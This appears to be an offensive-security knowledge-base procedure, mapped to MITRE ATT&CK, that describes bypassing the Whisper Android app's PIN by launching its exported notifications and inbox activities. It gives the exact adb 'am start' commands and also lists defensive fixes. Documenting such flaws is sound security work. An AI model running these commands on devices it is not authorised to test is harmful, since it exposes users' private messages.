---
tags:
  - android
  - auth-bypass
  - intent-injection
type: procedure
tools:
  - '[[tools/adb]]'
tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '[TIMESTAMP]'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:24:39.652Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c0dca377-9f59-4902-930c-f53dad6cc7ea
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Launch-Exported-Activities-for-Auth-Bypass

## Summary

This procedure exploits improperly exported Android activities to bypass authentication mechanisms, such as the 4-digit PIN in the Whisper app, granting direct access to protected features like notifications and inbox.

## Description

By sending Android intents to start exported activities without verification, attackers can circumvent app-level protections. In the Whisper app, activities like sh.whisper.WNotificationsActivity and sh.whisper.WInboxActivity are accessible via external intents, leading to authentication bypass and exposure of sensitive user data. This is particularly impactful on lost devices where physical access is available. The technical approach uses ADB or a malicious app to invoke components, rooted in failure to restrict exports per Android security best practices.

## Requirements

1. Identified exported activities from prior reconnaissance
2. ADB access to the target Android device
3. Whisper app installed and running in the background

## Defense

Defensive measures and detection strategies:

- Enforce android:exported="false" and add signature permissions for sensitive activities
- Implement runtime checks for intent origins within activities
- Use device-level monitoring for anomalous intent launches; audit app behavior on lost devices with remote wipe

## Objectives

1. Bypass PIN authentication to access protected app features
2. View and potentially exfiltrate user notifications and inbox data
3. Demonstrate privilege escalation through component abuse

## Instructions

### Step 1: Prepare Intent Launch via ADB

**Context**: Set up the shell environment to send activity-starting intents.

Enter ADB shell:

```bash
adb shell
```

> Provides a command prompt on the device for executing am (Activity Manager) commands.

### Step 2: Launch Notifications Activity

**Context**: Directly start the exported activity to bypass PIN and view notifications.

Execute the intent:

```bash
am start -n sh.whisper/.WNotificationsActivity
```

> Launches the activity; screen switches to notifications without PIN prompt, displaying sensitive content.

### Step 3: Launch Inbox Activity

**Context**: Repeat for inbox access to retrieve messages.

Execute the intent:

```bash
am start -n sh.whisper/.WInboxActivity
```

> Displays inbox data directly, confirming full auth bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Defense Evasion]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/adb]]

## Tags

- [[android]]
- [[auth-bypass]]
- [[intent-injection]]
